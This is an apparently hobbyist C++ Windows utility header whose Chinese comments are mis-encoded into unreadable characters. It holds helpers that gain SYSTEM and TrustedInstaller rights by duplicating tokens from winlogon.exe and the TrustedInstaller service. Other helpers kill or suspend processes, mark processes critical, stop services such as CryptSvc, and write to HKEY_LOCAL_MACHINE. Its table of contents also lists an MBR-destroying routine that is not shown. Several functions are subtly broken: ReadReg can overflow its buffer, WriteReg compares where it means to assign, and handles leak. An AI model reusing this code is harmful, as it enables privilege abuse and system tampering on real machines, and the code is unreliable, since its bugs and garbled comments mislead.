/************************************** 
@brief 			 xbebhxx3�����ϼ�
@license: 		 GPLv3 
@version  	     6.2
@remarks         ����ʱ�� -std=gnu++11 -lgdi32 -lwsock32
@author          xbehxx3
@date            2022/3/28
@file            x3-f.h
Copyright (c) 2022-2077 xbebhxx3
***************************************/
//�ܲ�Ҫɾ��ע����������QwQ

/*****************Ŀ¼*********************
x3-f.h
|- Ȩ�޲���
|	 |- ���debugȨ��
|	 |- �жϹ���ԱȨ��
|	 |- ��ù���ԱȨ��
|	 |- ���TrustedInstallerȨ��
|    |- ��systemȨ�޴�
|- ���̲���
|   |- ��������
|   |- �жϽ����Ƿ���� ,�����ؽ���id
|   |- ��ý���·��
|   |- �������
|   |- ����/����ؼ�����
|   |- ֹͣ����
|- ���ڲ���
|    |- �򿪴���
|    |- �رմ���
|    |- ��������
|    |- ��������
|- ע������
|     |- ��ע��� 
|     |- дע���
|     |- ɾ��ע�����
|     |- ɾ��ע���ֵ
|     |- ���ÿ�������
|- ��/�������
|	   |- Url����
|	   |- Url����
|	   |- ���� 
|- �ı���ɫ
|    |- RGB��ʼ�� 
|    |- RGB����
|- ����������
|- ������λ��
|- ���� 
|- strɾ���ո�
|- ��õ�ǰip
|- ��õ�ǰ�û���
|- ���ϵͳ�汾
|- ִ��cmd�����÷���ֵ 
|- ������� 
|- ���ش���
|- �桤ȫ��
|- ���ش���
|- �ƻ�mbr 

 ****************************************/
 
//ģ��
/**********************************************
 *  @Sample usage:   ʹ��ʵ�� 
 *  @brief           ����
 *  @param           ��������
 *  @return          ��������ֵ����
 *  @exception       �������쳣����
 *  @warning         ����ʹ������Ҫע��ĵط�
 *  @remarks         ��ע
 *  @note            ��ϸ����
 *  @author          xbebhxx3
 *  @version         �汾��
 *  @date            ����
 #  Copyright (c) 2022-2077 by xbebhxx3, All Rights Reserved
**********************************************/

#include <Windows.h> 
#include <TlHelp32.h>
#include <string>
#include <bits/stdc++.h>//û��ʵ�����ã�ֻ�����ô򲿷�ͷ�ļ� 
#ifndef CIRCLE_H
#define CIRCLE_H

using namespace std;

//Ȩ�޲�����ʼ 

/******************************
 *  @brief     ���debugȨ�� 
 *  @Sample usage: Debug(); 
 *  @return 	1�ɹ���0ʧ�� 
 *  @author     xbebhxx3
 *  @version    1.0
 *  @date       2021/1/13
 #  Copyright (c) 2022-2077 xbebhxx3
******************************/
BOOL Debug(){
	HANDLE hToken;
	if(!OpenProcessToken(GetCurrentProcess(),TOKEN_ALL_ACCESS,&hToken))return 0;
	LUID luid;
	if(!LookupPrivilegeValue(NULL,SE_DEBUG_NAME,&luid))return 0;
	TOKEN_PRIVILEGES tkp;
	tkp.PrivilegeCount = 1;
	tkp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
	tkp.Privileges[0].Luid = luid;
	if(!AdjustTokenPrivileges(hToken,0,&tkp,sizeof(tkp),NULL,NULL))return 0;
	return 1;
}

/******************************
 *  @brief     �жϹ���ԱȨ��
 *  @param     NULL
 *  @Return: 1����Ա��0����
 *  @note      ͷ�ļ��� #include <Windows.h>
 *  @Sample usage: IsProcessRunAsAdmin();
 *  @author     xbebhxx3
 *  @version    2.0
 *  @date       2022/3/28
 #  Copyright (c) 2022-2077 xbebhxx3
******************************/
bool IsProcessRunAsAdmin() {
	BOOL bElevated = FALSE;  
	HANDLE hToken = NULL;  
	if ( !OpenProcessToken( GetCurrentProcess(), TOKEN_QUERY, &hToken ) )return FALSE;
	TOKEN_ELEVATION tokenEle;
	DWORD dwRetLen = 0;  
	if ( GetTokenInformation( hToken, TokenElevation, &tokenEle, sizeof(tokenEle), &dwRetLen ) ) if ( dwRetLen == sizeof(tokenEle) ) bElevated = tokenEle.TokenIsElevated; 

	CloseHandle( hToken );  
	return bElevated;  
}

/******************************
 *  @brief     ��ù���ԱȨ��
 *  @param     NULL
 *  @Return: 1�Ѿ��ǹ���Ա
 *  @note      ͷ�ļ��� #include <Windows.h>
 *  @Sample usage: RunAsAdmin(); 
 *  @remarks    ��������IsProcessRunAsAdmin�ж��Ƿ�Ϊ����ԱȨ�� 
 *  @author     xbebhxx3
 *  @version    1.0
 *  @date       2022/3/28 
 #  Copyright (c) 2022-2077 xbebhxx3
******************************/
bool RunAsAdmin(){
	if(IsProcessRunAsAdmin()==1)return 1;
	char szFilePath[MAX_PATH + 1] = { 0 };
	GetModuleFileNameA(NULL, szFilePath, MAX_PATH);
	ShellExecute(NULL, "runas",szFilePath,NULL,NULL, SW_SHOW);
	exit(0);
} 

/******************************
 *  @brief     ���TrustedInstallerȨ��
 *  @param     NULL
 *  @Return: 1�Ѿ��ǹ���Ա
 *  @note      ͷ�ļ��� #include <Windows.h>
 *  @Sample usage: RunAsAdmin(); 
 *  @remarks    ��������IsProcessRunAsAdmin�ж��Ƿ�Ϊ����ԱȨ�� ��������UseTrustedInstaller��Ȩ ��������GetUser�жϵ�ǰ�û��� 
 *  @author     xbebhxx3
 *  @version    1.0
 *  @date       2022/3/28 
 #  Copyright (c) 2022-2077 xbebhxx3
******************************/
string GetUser(); 
bool UseTrustedInstaller(const char* exec);
bool RunAsTi(){
	RunAsAdmin();
	if(GetUser()!="SYSTEM"){
		char szFilePath[MAX_PATH + 1] = { 0 };
		GetModuleFileNameA(NULL, szFilePath, MAX_PATH);
		UseTrustedInstaller(szFilePath);
		exit(0);
	}
} 

/******************************
 *  @brief     ��system�û��򿪿�ִ���ļ� 
 *  @param     NULL
 *  @Return: 	1�ɹ�,0ʧ�� 
 *  @note      ͷ�ļ��� #include <Windows.h>
 *  @Sample usage: UseSystem("cmd"); 
 *  @author     xbebhxx3
 *  @version    1.0
 *  @date       2022/3/28 
 #  Copyright (c) 2022-2077 xbebhxx3
******************************/
int isProcess(const char* szImageName);
bool UseSystem(const char* exec) {
	int num = MultiByteToWideChar(0,0,exec,-1,NULL,0);
	wchar_t *wexec = new wchar_t[num];
	MultiByteToWideChar(0,0,exec,-1,wexec,num);
	DWORD PID_TO_IMPERSONATE = isProcess("winlogon.exe");
	HANDLE tokenHandle = NULL;
	HANDLE duplicateTokenHandle = NULL;
	//��������������Ľṹ
	STARTUPINFO startupInfo;
	PROCESS_INFORMATION processInformation;
	ZeroMemory(&startupInfo, sizeof(STARTUPINFO));
	ZeroMemory(&processInformation, sizeof(PROCESS_INFORMATION));
	startupInfo.cb = sizeof(STARTUPINFO);
	//��ȡ��ǰ������̵ľ�����е���Ȩ��
	BOOL getCurrentToken = OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES, NULL);
	Debug();
	// OpenProcess��ȡָ�����̵ľ��
	HANDLE processHandle = OpenProcess(PROCESS_QUERY_INFORMATION, true, PID_TO_IMPERSONATE);
	if (!processHandle){
		//�ƹ���΢��Ľ��̱���
		    OpenProcess(PROCESS_QUERY_LIMITED_INFORMATION, true, PID_TO_IMPERSONATE);
	}
	// ��ȡָ�����̵ľ������
	OpenProcessToken(processHandle, TOKEN_DUPLICATE | TOKEN_ASSIGN_PRIMARY | TOKEN_QUERY, &tokenHandle);
	//ģ��һ����½�û��ķ������Ƶİ�ȫ������
	if (ImpersonateLoggedOnUser(tokenHandle)) RevertToSelf();
	// ����һ����ǰ������ͬȨ�޵�����
	DuplicateTokenEx(tokenHandle, TOKEN_ADJUST_DEFAULT | TOKEN_ADJUST_SESSIONID | TOKEN_QUERY | TOKEN_DUPLICATE | TOKEN_ASSIGN_PRIMARY, NULL, SecurityImpersonation, TokenPrimary, &duplicateTokenHandle);
	// ����ָ�����������Ľ���
	return CreateProcessWithTokenW(duplicateTokenHandle, LOGON_WITH_PROFILE,wexec, NULL, 0, NULL, NULL, (LPSTARTUPINFOW)&startupInfo, &processInformation) ;

}

/******************************
 *  @brief     ��TrustedInstaller�û��򿪿�ִ���ļ� 
 *  @param     NULL
 *  @Return:    1�ɹ�,0ʧ�� 
 *  @note      ͷ�ļ��� #include <Windows.h>
 *  @Sample usage: UseTrustedInstaller("cmd"); 
 *  @remarks    ��������IsProcess���TrustedInstaller����pid ����ʱ�� -std=gnu++11 
 *  @author     xbebhxx3
 *  @version    5.0
 *  @date       2022/8/10 
 #  Copyright (c) 2022-2077 xbebhxx3
******************************/
bool UseTrustedInstaller(const char* exec){
	int num = MultiByteToWideChar(0,0,exec,-1,NULL,0);
	wchar_t *wexec = new wchar_t[num];
	MultiByteToWideChar(0,0,exec,-1,wexec,num);
	Debug();
	HANDLE hSystemToken = nullptr, IhDupToken = nullptr, hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS,0);
	PROCESSENTRY32W pe = {0};
	pe.dwSize = sizeof(PROCESSENTRY32W);
	Process32FirstW(hSnapshot, &pe);
	while( Process32NextW(hSnapshot, &pe) && _wcsicmp(pe.szExeFile, L"winlogon.exe") );
	OpenProcessToken(OpenProcess(PROCESS_DUP_HANDLE | PROCESS_QUERY_INFORMATION,FALSE,pe.th32ProcessID),MAXIMUM_ALLOWED,&hSystemToken);
	SECURITY_ATTRIBUTES ItokenAttributes;
	ItokenAttributes.nLength = sizeof(SECURITY_ATTRIBUTES);
	ItokenAttributes.lpSecurityDescriptor = nullptr;
	ItokenAttributes.bInheritHandle = FALSE;
	DuplicateTokenEx(hSystemToken,MAXIMUM_ALLOWED,&ItokenAttributes,SecurityImpersonation,TokenImpersonation,&IhDupToken);
	ImpersonateLoggedOnUser(IhDupToken);//��������������Ľṹ
	HANDLE hTIProcess = nullptr, hTIToken = nullptr, hDupToken = nullptr;
    HANDLE hToken = nullptr;
    LPVOID lpEnvironment = nullptr;
	LPWSTR lpBuffer = nullptr;
	SC_HANDLE hSCManager = nullptr;
	SC_HANDLE hService = nullptr;
	DWORD dwProcessId = 0;
	BOOL res = TRUE, started = TRUE;
	hSCManager = OpenSCManager(nullptr,SERVICES_ACTIVE_DATABASE,GENERIC_EXECUTE);
	hService = OpenServiceW(hSCManager,L"TrustedInstaller",GENERIC_READ | GENERIC_EXECUTE);
	SERVICE_STATUS_PROCESS statusBuffer = {0};
	DWORD bytesNeeded;
	while( 	dwProcessId == 0 &&started && (res = QueryServiceStatusEx(hService,SC_STATUS_PROCESS_INFO,reinterpret_cast<LPBYTE>(&statusBuffer),sizeof(SERVICE_STATUS_PROCESS),&bytesNeeded)) ) {
		switch( statusBuffer.dwCurrentState ) {
			case SERVICE_STOPPED:
				started = StartServiceW(hService, 0, nullptr);
			case SERVICE_STOP_PENDING:
				Sleep(statusBuffer.dwWaitHint);
			case SERVICE_RUNNING:
				dwProcessId = statusBuffer.dwProcessId;
		}
	}
	hTIProcess = OpenProcess( PROCESS_DUP_HANDLE | PROCESS_QUERY_INFORMATION, FALSE, dwProcessId);
	OpenProcessToken(hTIProcess, MAXIMUM_ALLOWED, &hTIToken);
	SECURITY_ATTRIBUTES tokenAttributes;
	tokenAttributes.nLength = sizeof(SECURITY_ATTRIBUTES);
	tokenAttributes.lpSecurityDescriptor = nullptr;
	tokenAttributes.bInheritHandle = FALSE;
	DuplicateTokenEx(hTIToken,MAXIMUM_ALLOWED,&tokenAttributes,SecurityImpersonation,TokenImpersonation,&hDupToken);
	OpenProcessToken(GetCurrentProcess(), TOKEN_READ, &hToken);
	DWORD nBufferLength = GetCurrentDirectoryW(0, nullptr);
	lpBuffer = (LPWSTR)(new wchar_t[nBufferLength]{0});
	GetCurrentDirectoryW(nBufferLength, lpBuffer);
	STARTUPINFOW startupInfo;
	ZeroMemory(&startupInfo, sizeof(STARTUPINFOW));
	startupInfo.lpDesktop = (LPWSTR)L"Winsta0\\Default";
	PROCESS_INFORMATION processInfo;
	ZeroMemory(&processInfo, sizeof(PROCESS_INFORMATION));
    return CreateProcessWithTokenW(hDupToken,LOGON_WITH_PROFILE,nullptr,wexec,CREATE_UNICODE_ENVIRONMENT,lpEnvironment,lpBuffer,&startupInfo,&processInfo);
}

//Ȩ�޲������� 

//���̲�����ʼ 

/******************************
 *  @brief     ��������
 *  @param     szImageName:������
 *  @note      ͷ�ļ��� #include <Windows.h> #include <TlHelp32.h> #include <string>
 *  @Sample usage:	KillProcess("cmd.exe");
 *  @author     xbebhxx3
 *  @version    2.0
 *  @date       2022/3/15
 #  Copyright (c) 2022-2077 xbebhxx3
******************************/
void KillProcess(const char* szImageName) {
	PROCESSENTRY32 pe = {sizeof(PROCESSENTRY32) }; //��ý����б�
	HANDLE hProcess = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);//�������
	BOOL bRet = Process32First(hProcess,&pe);//���������е�һ��������Ϣ
	while(bRet) { //�жϲ������һ�����̣���������
		if(lstrcmp(szImageName,pe.szExeFile)==0) {//�ж��ǲ���Ҫ�����Ľ���
			TerminateProcess(OpenProcess(PROCESS_ALL_ACCESS, FALSE,pe.th32ProcessID), 0);//�򿪽��̲�ɱ��
		}
		bRet = Process32Next(hProcess,&pe);//��һ������
	}
	return;
}

/******************************
 *  @brief     �жϽ����Ƿ���� ,�����ؽ���id 
 *  @param     szImageName:������
 *  @note      ͷ�ļ��� #include <Windows.h> #include <TlHelp32.h> #include <string>
 *  @Sample usage:	isProcess("cmd.exe");
 * 	@Return: 	0������ ��0Ϊ����id 
 * 	@author     xbebhxx3
 * 	@version    1.0
 * 	@date       2022/3/15
 #  Copyright (c) 2022-2077 xbebhxx3
******************************/
int isProcess(const char* szImageName) {
	PROCESSENTRY32 pe = {sizeof(PROCESSENTRY32) }; //��ý����б� 
	HANDLE hProcess = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);//������� 
	BOOL bRet = Process32First(hProcess,&pe);//���������е�һ��������Ϣ 
	while(bRet){//�������һ�����̣���������
		if(lstrcmp(szImageName,pe.szExeFile)==0) return pe.th32ProcessID;
		bRet = Process32Next(hProcess,&pe);//��һ������ 
	} 
	return 0;
}	

/******************************
 *  @brief     ��ý���·�� 
 *  @param     szImageName:������
 *  @note      ͷ�ļ��� #include <Windows.h> #include <TlHelp32.h> #include <string>
 *  @Sample usage:	GetProcesslocation("cmd.exe");
 * 	@Return: 	����λ��
 *  @remarks    �Ǳ������� isProcess�жϽ����Ƿ���� 
 * 	@author     xbebhxx3
 * 	@version    1.0
 * 	@date       2022/5/18
 #  Copyright (c) 2022-2077 xbebhxx3
******************************/
string GetProcesslocation(const char* szImageName){
	if(isProcess(szImageName)==0)return "0";
	HANDLE hProcessSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS,0); // �������̿���
	PROCESSENTRY32 process = {sizeof(PROCESSENTRY32)};	// �������� hProcessSnap ����Ϣ	
	while (Process32Next(hProcessSnap,&process)){// �������̿���
		string processName = process.szExeFile; // char* ת string
		if(processName == szImageName){// �ҵ� ����
				//��ý���·�� 
				PROCESSENTRY32* pinfo = new PROCESSENTRY32; //������Ϣ ��pinfo->dwSize = sizeof(PROCESSENTRY32);��
				MODULEENTRY32* minfo = new MODULEENTRY32; //ģ����Ϣ ��minfo->dwSize = sizeof(MODULEENTRY32);��
			    char shortpath[MAX_PATH];				//����·������
				int flag = Process32First(hProcessSnap,pinfo);	// �ӵ�һ�����̿�ʼ
			    while(flag){
					if(strcmp(pinfo->szExeFile, szImageName) == 0){	// ������������
						HANDLE hModule = CreateToolhelp32Snapshot(TH32CS_SNAPMODULE,pinfo->th32ProcessID); // �������̿���
						Module32First(hModule,minfo);  // �ѵ�һ��ģ����Ϣ�� minfo  
						GetShortPathName(minfo->szExePath,shortpath,256); // ���ļ�·���� shortpath
						break;
					}
					flag = Process32Next(hProcessSnap, pinfo);// ��һ������
			    }
			return shortpath;
			break;
		}
	}
}

/******************************
 *  @brief     ������� 
 *  @param     dwProcessID:����ID,fSuspend: TRUE����,FALSE��� 
 *  @note      ͷ�ļ��� #include <Windows.h> #include <TlHelp32.h>
 *  @Sample usage:	SuspendProcess(isProcess("cmd.exe"),1);
 * 	@Return: 	1�ɹ���0 ʧ��
 * 	@author     xbebhxx3
 * 	@version    1.0
 * 	@date       2022/5/18
 #  Copyright (c) 2022-2077 xbebhxx3
******************************/
bool SuspendProcess(DWORD dwProcessID, BOOL fSuspend){  
	bool ret=1;
	Debug();
    HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, dwProcessID);  
    if (hSnapshot != INVALID_HANDLE_VALUE) {  
        THREADENTRY32 te = {sizeof(te)};  
        BOOL fOk = Thread32First(hSnapshot, &te);  
        for (; fOk; fOk = Thread32Next(hSnapshot, &te))if (te.th32OwnerProcessID == dwProcessID) {  
            if (fSuspend){
            	if(SuspendThread(OpenThread(THREAD_SUSPEND_RESUME,FALSE, te.th32ThreadID))==-1)ret=0;  
			} 
            else {
            	if(ResumeThread(OpenThread(THREAD_SUSPEND_RESUME,FALSE, te.th32ThreadID))==-1)ret=0;
			}  
        }  
        CloseHandle(OpenThread(THREAD_SUSPEND_RESUME,FALSE, te.th32ThreadID));  
    }  
	CloseHandle(hSnapshot);  
	return ret;
}  

/******************************
 *  @brief     ����/����ؼ����� 
 *  @param     id:����id ,fSuspend:1�ؼ���0��ͨ 
 *  @note      ͷ�ļ��� #include <Windows.h> #include <TlHelp32.h>
 *  @Sample usage:	CriticalProcess(1000,1);
 * 	@Return: 	1�ɹ���0ʧ�� 
 *  @remarks    �������� Debug() ��Ȩ 
 * 	@author     xbebhxx3
 * 	@version    1.0
 * 	@date       2022/3/28
 #  Copyright (c) 2022-2077 xbebhxx3
******************************/
typedef NTSTATUS(NTAPI *_NtSetInformationProcess)(HANDLE ProcessHandle,PROCESS_INFORMATION_CLASS ProcessInformationClass,PVOID ProcessInformation,ULONG ProcessInformationLength);
bool CriticalProcess(DWORD dwProcessID, BOOL fSuspend){
	Debug();
	_NtSetInformationProcess NtSetInformationProcess = (_NtSetInformationProcess)GetProcAddress(GetModuleHandleA("NtDll.dll"), "NtSetInformationProcess");
	if (!NtSetInformationProcess) return 0;
	if(NtSetInformationProcess(OpenProcess(PROCESS_ALL_ACCESS, FALSE, dwProcessID), (PROCESS_INFORMATION_CLASS)29, &fSuspend, sizeof(ULONG))<0)return 0;
	else return 1;
}

/******************************
 *  @brief     ֹͣ���� 
 *  @param     ������
 *  @note      ͷ�ļ��� #include <Windows.h> #include <TlHelp32.h>
 *  @Sample usage:	CriticalProcess("CryptSvc");
 * 	@Return: 	1�ɹ���0ʧ�� 
 * 	@author     xbebhxx3
 * 	@version    1.0
 * 	@date       2022/3/28
 #  Copyright (c) 2022-2077 xbebhxx3
******************************/
bool CloseService(char* service) {
    SC_HANDLE hSC = OpenSCManager(NULL, NULL, SC_MANAGER_ALL_ACCESS);
    if (hSC == NULL) return false;
    
    SC_HANDLE hSvc = ::OpenService(hSC, service,SERVICE_START | SERVICE_QUERY_STATUS | SERVICE_STOP);//�򿪷��� 
    if (hSvc == NULL){
        CloseServiceHandle(hSC);
        return false;
    }
    SERVICE_STATUS status;
    if (QueryServiceStatus(hSvc, &status) == FALSE){//��÷���״̬ 
        CloseServiceHandle(hSvc);
        CloseServiceHandle(hSC);
        return false;
    }
    if (status.dwCurrentState == SERVICE_RUNNING){//����������У�ֹͣ���� 
        if (::ControlService(hSvc,
            SERVICE_CONTROL_STOP, &status) == FALSE)
        {
            CloseServiceHandle(hSvc);
            CloseServiceHandle(hSC);
            return false;
        }
        while (::QueryServiceStatus(hSvc, &status) == TRUE){//�ȴ�����ֹͣ 
            Sleep(status.dwWaitHint);
            if (status.dwCurrentState == SERVICE_STOPPED){
                CloseServiceHandle(hSvc);
                CloseServiceHandle(hSC);
                return true;
            }
        }
    }

    ::CloseServiceHandle(hSvc);
    ::CloseServiceHandle(hSC);
    return true;
}

//���̲������� 

//���ڲ�����ʼ 

/******************************
 *  @brief ���ڲ��� 
 	SerialPort w;//ʹ�ã����Ǳ�����w
	w.open("\\\\.\\COM7");//��COM7 ���Ǳ�����COM7 
	w.close()//�ر�
	w.send("at\r");//���� 
	w.receive()��//���� 
 *  @note      ͷ�ļ��� #include <Windows.h>
 * 	@author     xbebhxx3
 * 	@version    5.0
 * 	@date       2022/8/12
 #  Copyright (c) 2022-2077 xbebhxx3
******************************/
class SerialPort
{
public:
	SerialPort();
	~SerialPort();
	bool open(const char* portname,int baudrate,char parity,char databit,char stopbit,char synchronizeflag);// �򿪴���,�ɹ�����true��ʧ�ܷ���false
	void close();//�رմ���
	int send(string dat);//�������ݻ�д���ݣ��ɹ����ط������ݳ��ȣ�ʧ�ܷ���0
	string receive();//�������ݻ�����ݣ��ɹ����ض�ȡʵ�����ݵĳ��ȣ�ʧ�ܷ���0
private:
	int pHandle[16];
	char synchronizeflag;
};
SerialPort::SerialPort(){}
SerialPort::~SerialPort(){}
/******************************
 *  @brief     �򿪴��� 
 *  @param     
 	portname(������): ��Windows����"COM1""COM2"�ȣ���Linux����"/dev/ttyS1"��
	baudrate(������): 9600��19200��38400��43000��56000��57600��115200 
	parity(У��λ): 0Ϊ��У�飬1Ϊ��У�飬2ΪżУ�飬3Ϊ���У��
	databit(����λ): 4-8��ͨ��Ϊ8λ
	stopbit(ֹͣλ): 1Ϊ1λֹͣλ��2Ϊ2λֹͣλ,3Ϊ1.5λֹͣλ
	synchronizable(ͬ�����첽): 0Ϊ�첽��1Ϊͬ��
 *  @note      �Ƕ���ģ��
 *  @Sample usage:	open(�˿ں�);
 * 	@Return: 	�ɹ�����true��ʧ�ܷ���false
 * 	@author     xbebhxx3
 * 	@version    2.0
 * 	@date       2022/8/13
 #  Copyright (c) 2022-2077 xbebhxx3
******************************/
bool SerialPort::open(const char* portname, int baudrate = 115200, char parity = 0, char databit = 8, char stopbit = 1, char synchronizeflag = 1){
	this->synchronizeflag = synchronizeflag;
	HANDLE hCom = NULL;
	if (this->synchronizeflag) hCom = CreateFileA(portname,GENERIC_READ | GENERIC_WRITE,0,NULL,OPEN_EXISTING,0, NULL);//ͬ����ʽ
	else hCom = CreateFileA(portname,GENERIC_READ | GENERIC_WRITE,0,NULL,OPEN_EXISTING,FILE_FLAG_OVERLAPPED,NULL);//�첽��ʽ
	if (hCom == (HANDLE)-1) return false;
	if (!SetupComm(hCom, 1024, 1024))return false;//���û�������С
	// ���ò��� 
	DCB p;
	memset(&p, 0, sizeof(p));
	p.DCBlength = sizeof(p);
	p.BaudRate = baudrate; // ������
	p.ByteSize = databit; // ����λ
	switch (parity) //У��λ
	{
	case 0:
		p.Parity = NOPARITY; //��У��
		break;
	case 1:
		p.Parity = ODDPARITY; //��У��
		break;
	case 2:
		p.Parity = EVENPARITY; //żУ��
		break;
	case 3:
		p.Parity = MARKPARITY; //���У��
		break;
	}
	switch (stopbit) //ֹͣλ
	{
	case 1:
		p.StopBits = ONESTOPBIT; //1λֹͣλ
		break;
	case 2:
		p.StopBits = TWOSTOPBITS; //2λֹͣλ
		break;
	case 3:
		p.StopBits = ONE5STOPBITS; //1.5λֹͣλ
		break;
	}
	if (!SetCommState(hCom, &p)) return false;// ���ò���ʧ��
	COMMTIMEOUTS TimeOuts;//��ʱ����,��λ�����룬�ܳ�ʱ��ʱ��ϵ��������д���ַ�����ʱ�䳣��
	TimeOuts.ReadIntervalTimeout = 1000; //�������ʱ
	TimeOuts.ReadTotalTimeoutMultiplier = 500; //��ʱ��ϵ��
	TimeOuts.ReadTotalTimeoutConstant = 5000; //��ʱ�䳣��
	TimeOuts.WriteTotalTimeoutMultiplier = 500; // дʱ��ϵ��
	TimeOuts.WriteTotalTimeoutConstant = 2000; //дʱ�䳣��
	SetCommTimeouts(hCom, &TimeOuts);
	PurgeComm(hCom, PURGE_TXCLEAR | PURGE_RXCLEAR);//��մ��ڻ�����
	memcpy(pHandle, &hCom, sizeof(hCom));// ������
	return true;
}

/******************************
 *  @brief     �رմ��� 
 *  @param     NULL
 *  @note      �Ƕ���ģ�� 
 *  @Sample usage:	open(�˿ں�);
 * 	@Return: 	�ɹ�����true��ʧ�ܷ���false
 * 	@author     xbebhxx3
 * 	@version    1.0
 * 	@date       2022/8/13
 #  Copyright (c) 2022-2077 xbebhxx3
******************************/
void SerialPort::close(){
	HANDLE hCom = *(HANDLE*)pHandle;
	CloseHandle(hCom);
}

/******************************
 *  @brief     ��������
 *  @param     dat:���͵����� 
 *  @note      �Ƕ���ģ�� 
 *  @Sample usage:	send(���͵�����);
 * 	@Return: 	�ɹ����ط������ݳ��ȣ�ʧ�ܷ���0
 * 	@author     xbebhxx3
 * 	@version    1.0
 * 	@date       2022/8/13
 #  Copyright (c) 2022-2077 xbebhxx3
******************************/
int SerialPort::send(string dat){
	HANDLE hCom = *(HANDLE*)pHandle;
	if (this->synchronizeflag){// ͬ����ʽ
		DWORD dwBytesWrite = dat.length(); //�ɹ�д��������ֽ���
		BOOL bWriteStat = WriteFile(hCom,(char*)dat.c_str(),dwBytesWrite,&dwBytesWrite,NULL);//ͬ������
		if (!bWriteStat) return 0;
		return dwBytesWrite;
	}
	else{//�첽��ʽ
		DWORD dwBytesWrite = dat.length(); //�ɹ�д��������ֽ���
		DWORD dwErrorFlags; //�����־
		COMSTAT comStat; //ͨѶ״̬
		OVERLAPPED m_osWrite; //�첽��������ṹ��
		memset(&m_osWrite, 0, sizeof(m_osWrite));//����һ������OVERLAPPED���¼��������������õ�����ϵͳҪ����ô��
		ClearCommError(hCom, &dwErrorFlags, &comStat); //���ͨѶ���󣬻���豸��ǰ״̬
		BOOL bWriteStat = WriteFile(hCom,(char*)dat.c_str(),dwBytesWrite,&dwBytesWrite,&m_osWrite); //�첽����
		if (!bWriteStat) if (GetLastError() == ERROR_IO_PENDING) WaitForSingleObject(m_osWrite.hEvent, 500); //�����������д��ȴ�д���¼�0.5����
		else{
			ClearCommError(hCom, &dwErrorFlags, &comStat); //���ͨѶ����
			CloseHandle(m_osWrite.hEvent); //�رղ��ͷ�hEvent�ڴ�
			return 0;
		}
		return dwBytesWrite;
	}
}

/******************************
 *  @brief     ��������
 *  @param     NULL
 *  @note      �Ƕ���ģ�� 
 *  @Sample usage:	receive();
 * 	@Return: 	����
 * 	@author     xbebhxx3
 * 	@version    3.0
 * 	@date       2022/8/13
 #  Copyright (c) 2022-2077 xbebhxx3
******************************/
string SerialPort::receive(){
	HANDLE hCom = *(HANDLE*)pHandle;
	string rec_str = "";
	char buf[1024];
	if (this->synchronizeflag){//ͬ����ʽ
		DWORD wCount=1024; //�ɹ���ȡ�������ֽ���
		BOOL bReadStat = ReadFile(hCom,buf,wCount,&wCount,NULL); //ͬ������
		for (int i = 0; i < strlen(buf); i++){
			if (buf[i] != -52)rec_str += buf[i];				
			else break;
		}
		return rec_str;
	}
	else{//�첽��ʽ
		DWORD wCount = 1024; //�ɹ���ȡ�������ֽ���
		DWORD dwErrorFlags; //�����־
		COMSTAT comStat; //ͨѶ״̬
		OVERLAPPED m_osRead; //�첽��������ṹ��
		memset(&m_osRead, 0, sizeof(m_osRead));//����һ������OVERLAPPED���¼��������������õ�����ϵͳҪ����ô��
		ClearCommError(hCom, &dwErrorFlags, &comStat); //���ͨѶ���󣬻���豸��ǰ״̬
		if (!comStat.cbInQue)return ""; //������뻺�����ֽ���Ϊ0���򷵻�false
		BOOL bReadStat = ReadFile(hCom,buf,wCount,&wCount,&m_osRead); //�첽���� 
		if (!bReadStat){
			if (GetLastError() == ERROR_IO_PENDING)GetOverlappedResult(hCom, &m_osRead, &wCount, TRUE);//����������ڶ�ȡ�У�GetOverlappedResult���������һ��������ΪTRUE��������һֱ�ȴ���ֱ����������ɻ����ڴ��������
			else{
				ClearCommError(hCom, &dwErrorFlags, &comStat); //���ͨѶ����
				CloseHandle(m_osRead.hEvent); //�رղ��ͷ�hEvent���ڴ�
				return "";
			}
		}
		for (int i = 0; i < strlen(buf); i++){
			if (buf[i] != -52)rec_str += buf[i];
			else break;
		}
		return rec_str;
	}
}
//���ڲ������� 

//ע��������ʼ 

/******************************
 *  @brief     ��ע���
 *  @param     path:·�� key��key
 *  @note      ͷ�ļ��� #include <windows.h>
 *  @Sample usage: ReadReg("Software\\xbebhxx3", "aaa");
 *  @ Return:   ע���ֵ��0Ϊʧ�� 
 *  @author     xbebhxx3
 *  @version    1.0
 *  @date       2022/3/28 
 #  Copyright (c) 2021-2077 xbebhxx3
******************************/
char* ReadReg(const char* path, const char* key)
{
	static char value[32]={0};
	HKEY hKey;
	int ret = RegOpenKeyEx(HKEY_LOCAL_MACHINE, path, 0, KEY_EXECUTE, &hKey);
	if (ret != ERROR_SUCCESS)return 0;
	//��ȡKEY
	DWORD dwType = REG_SZ; //��������
	DWORD cbData = 256;
	ret = RegQueryValueEx(hKey, key, NULL, &dwType, (LPBYTE)value, &cbData);
	if (ret == ERROR_SUCCESS)return value;
	RegCloseKey(hKey);
	return 0;
}
/******************************
 *  @brief     дע���
 *  @param     path:·�� key��key, value��ֵ 
 *  @note      ͷ�ļ��� #include <windows.h>
 *  @Sample usage: WriteReg("Software\\xbebhxx3", "aaa", "bbb");
 *  @ Return:   1�ɹ���0ʧ�� 
 *  @author     xbebhxx3
 *  @version    1.0
 *  @date       2022/3/28 
 #  Copyright (c) 2021-2077 xbebhxx3
******************************/
bool WriteReg(const char* path, const char* key, const char* value)
{
	HKEY hKey;
	DWORD dwDisp;
	DWORD dwType = REG_SZ; //��������
	int ret = RegCreateKeyEx(HKEY_LOCAL_MACHINE, path,0, NULL, REG_OPTION_NON_VOLATILE, KEY_ALL_ACCESS, NULL, &hKey, &dwDisp);
	if (ret != ERROR_SUCCESS){
		RegCloseKey(hKey);
		return 0;
	}
	ret == RegSetValueEx(hKey, key, 0, dwType, (BYTE*)value, strlen(value));
	RegCloseKey(hKey);
	return 1;
}
 
/******************************
 *  @brief     ɾ��ע����� 
 *  @param     path:·��
 *  @note      ͷ�ļ��� #include <windows.h>
 *  @Sample usage: DelReg("Software\\xbebhxx3");
 *  @ Return:   1�ɹ���0ʧ�� 
 *  @author     xbebhxx3
